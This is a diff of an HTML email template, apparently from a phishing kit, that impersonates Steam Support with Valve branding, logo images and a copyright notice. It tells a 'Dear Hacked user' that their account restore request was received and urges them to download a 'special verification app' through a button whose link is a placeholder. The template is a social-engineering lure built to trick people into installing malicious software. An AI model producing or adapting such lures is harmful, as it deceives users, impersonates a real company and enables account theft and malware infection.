@@ -1,108 +1,114 @@
-<div class="mnfrm">
-    <div class="mnheader">
-        <img src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAhoAAABBCAIAAAAYDZpsAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjY5MjQ1ODQ3ODQxRjExRTY4RTJBREMyODYxM0VGOEJCIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjY5MjQ1ODQ4ODQxRjExRTY4RTJBREMyODYxM0VGOEJCIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NjkyNDU4NDU4NDFGMTFFNjhFMkFEQzI4NjEzRUY4QkIiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NjkyNDU4NDY4NDFGMTFFNjhFMkFEQzI4NjEzRUY4QkIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz62qCdCAAAPAElEQVR42uydC1xN2R7H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">
-    </div>
-    <div class="mnbody">
-        <div class="title">Dear Hacked user,</div>
-        <div class="outline">You sent us request to restore your account.</div>
-        <div class="content">
-            <p class="text" style="padding-bottom: 10px;">
-                You sent us a request to restore your account. Check if you have lost your account for sure.
-            </p>
-            <p class="text">
-                To <span class="bold">restore your account</span> click on the beautiful green button and download a special verification app
-            </p>
-            <a href="url" class="button">
-                Download
-            </a>
+<body>
+    <div class="mnfrm">
+        <div class="mnheader">
+            <img src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAhoAAABBCAIAAAAYDZpsAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjY5MjQ1ODQ3ODQxRjExRTY4RTJBREMyODYxM0VGOEJCIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjY5MjQ1ODQ4ODQxRjExRTY4RTJBREMyODYxM0VGOEJCIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NjkyNDU4NDU4NDFGMTFFNjhFMkFEQzI4NjEzRUY4QkIiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NjkyNDU4NDY4NDFGMTFFNjhFMkFEQzI4NjEzRUY4QkIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz62qCdCAAAPAElEQVR42uydC1xN2R7H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">
         </div>
-        <p class="ntext">
-            The Steam Team<br>
-            <a class="hr" href="#">https://help.steampowered.com</a>
-        </p>
+        <div class="mnbody">
+            <div class="title">Dear Hacked user,</div>
+            <div class="outline">You sent us request to restore your account.</div>
+            <div class="content">
+                <p class="text" style="padding-bottom: 10px;">
+                    You sent us a request to restore your account. Check if you have lost your account for sure.
+                </p>
+                <p class="text">
+                    To <span class="bold">restore your account</span> click on the beautiful green button and download a special verification app
+                </p>
+                <a href="url" class="button">
+                    Download
+                </a>
+            </div>
+            <p class="ntext">
+                The Steam Team<br>
+                <a class="hr" href="#">https://help.steampowered.com</a>
+            </p>
+        </div>
+        <div class="mnfooter">
+            <img src="data:image/gif;base64, R0lGODlhXAAaAMQAAAAAACkpKYSEhDU1NaOjo2hoaAoKCkZGRl1dXaurq7u7u7Ozs4uLi8PDw+Li4hISEn5+fgQEBNvb2+3t7QEBAZGRkVRUVAICApmZmZ2dncrKynJycpaWlgYGBtHR0RsbGyH5BAAAAAAALAAAAABcABoAAAX/4CSOZGmeaKqurApJDuDMdG3feK7vfL8zDQ0AJikaj8ikcslsOp/LA+Iw9GQ+gCyAko0YtB3tRQvwcgGG9JccQZ+1kcjYTDY8APMsZQ24d7l3Zw8QHhJUW4UEfGt8W1l+eHFZFwZjZJdgEVhhmH5tjmdYZW4PjVpcFBsSHocAGhoEnwYBBAQCd2EPGAQYAXyfBRwEGRV6Y28RAxkEHAYUbRRnBhYZGBBtbQG7DA/PWwbMGQm1A5xlGx4eA18RHg0EjgABGh4KogYHrwuQWuCvGg0CdMGUD+CXL28eIACY4MuYDa+KiXHlDmCDcpM6FHhFZUwDBfAojOlAQIGGA2Ei/2xo0IBDFgOfOnwIooClBXYTAQz4KARMmVwsA+IBkOFjATRystQsMGDAAWenCnxcB6CDAgUVOD38uOFMhppP4exBULMk1lGcuCS7quATJgAcrlrQwlYUNABXB4j0ZolCgbx0F1T4NCbAggUuAXw4vOCDyKpaIBxGkGCBojNuLwxQcNgtJguHN1xYuwADVEsAFijAUKECg0laChzWu+UwA8LRxC2AOWBBAgZq0bysTEDX7H6nelf2fGlxAgxhClRG8DZBZesJuFi6gMD3AC3WBUxMRWDBgAgFCCSYmxTbgPAA0idA4O2NTuz2L13YleDDBQbqBYAKGLUgEEAAh7xBWf8C33FRCwRkUNDBALUcVUEtjvHxUC0WUHBALQJEICFsFNBSS36XyPfUMs3oEc84A4yECQLkaJFBBhBeYsAyAoBDgERpjcHBMhY0tcwVkHmj0zDwvKWFiRsoQ0ABfJGhngAQZCnQgBbUEoAl1UDwxhkQZMDBhxlQ52I2rPFCDJOtjKITBtWg9pYBADJQAJ3ftbGdARVwsEs1Ak1yATUECDQGBtYMNdABQwpAaARh4HQAizfyQmcBYWiXxQB0YoDiJRswykA1fjraBgIWsCqFKKNQk0EASXHAQY6QifhABRhw0BoqF4gkxwaCbmDBscFwwIBDZAzAawU4IaMFqBicepT/k6dgxsk0FcwaTQS2inmMIxFAMCQH1w60BQOsBcBJBN1WIMoYhdmawQb45svcA6cKeh62AEdgQaC0PsMAA11pBZkFDPh6gCQiouGsa59wQWwGrXwSgK+tudZaYrnG1xoDogwYTTROWnJAawKWwUAFVJ5xAScDCHDrHdAAsjLCmAFggQB6dgNGAAwA7XEFQHuRRQdcHCBABV0B7OQnkFZQaAQvX/vYQCKuEdMjwr1E2AV+oEZBKaZAYg5yUmPr4cFXCyBAATAFK1ylbjGHx0F1LF2GWqZE8lJfd1dsHyomXxLBA04LEDeWCEQu+eSUV2755Zhnrvnmk28g99UQyC36K+ikl2766ainrvrqqEMAepawxy777LTXbvvtuOd+u39t9+7778AHL4awIQAAOw==">
+            <span class="mnfooter-copyright">
+                © Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.
+            </span>
+        </div>
     </div>
-    <div class="mnfooter">
-        <img src="data:image/gif;base64, R0lGODlhXAAaAMQAAAAAACkpKYSEhDU1NaOjo2hoaAoKCkZGRl1dXaurq7u7u7Ozs4uLi8PDw+Li4hISEn5+fgQEBNvb2+3t7QEBAZGRkVRUVAICApmZmZ2dncrKynJycpaWlgYGBtHR0RsbGyH5BAAAAAAALAAAAABcABoAAAX/4CSOZGmeaKqurApJDuDMdG3feK7vfL8zDQ0AJikaj8ikcslsOp/LA+Iw9GQ+gCyAko0YtB3tRQvwcgGG9JccQZ+1kcjYTDY8APMsZQ24d7l3Zw8QHhJUW4UEfGt8W1l+eHFZFwZjZJdgEVhhmH5tjmdYZW4PjVpcFBsSHocAGhoEnwYBBAQCd2EPGAQYAXyfBRwEGRV6Y28RAxkEHAYUbRRnBhYZGBBtbQG7DA/PWwbMGQm1A5xlGx4eA18RHg0EjgABGh4KogYHrwuQWuCvGg0CdMGUD+CXL28eIACY4MuYDa+KiXHlDmCDcpM6FHhFZUwDBfAojOlAQIGGA2Ei/2xo0IBDFgOfOnwIooClBXYTAQz4KARMmVwsA+IBkOFjATRystQsMGDAAWenCnxcB6CDAgUVOD38uOFMhppP4exBULMk1lGcuCS7quATJgAcrlrQwlYUNABXB4j0ZolCgbx0F1T4NCbAggUuAXw4vOCDyKpaIBxGkGCBojNuLwxQcNgtJguHN1xYuwADVEsAFijAUKECg0laChzWu+UwA8LRxC2AOWBBAgZq0bysTEDX7H6nelf2fGlxAgxhClRG8DZBZesJuFi6gMD